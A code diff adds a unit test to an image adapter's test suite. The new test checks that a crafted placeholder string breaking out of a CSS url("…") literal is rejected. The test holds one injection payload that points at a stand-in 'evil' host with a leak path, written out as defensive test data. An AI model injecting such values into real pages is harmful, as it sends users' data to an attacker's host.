@@ -65,6 +65,13 @@ describe('imageAdapter', () => {
     expect(m.element.style.backgroundImage).toContain('data:image/png')
   })
 
+  it('rejects a placeholder that breaks out of the url("…") literal', () => {
+    // contains "/" so it passes the path heuristic, but the embedded quote would inject a
+    // second comma-separated url() → attacker-controlled image request. Must be rejected.
+    const m = imageAdapter().mount(img({ placeholder: 'x"), url("//evil/leak?c=' }), slot(), ctx())
+    expect(m.element.style.backgroundImage).toBe('')
+  })
+
   it('returns the naturalSize hint without a load', () => {
     const m = imageAdapter().mount(img({ naturalSize: { w: 800, h: 600 } }), slot(), ctx())
     expect(m.naturalSize?.()).toEqual({ w: 800, h: 600 })
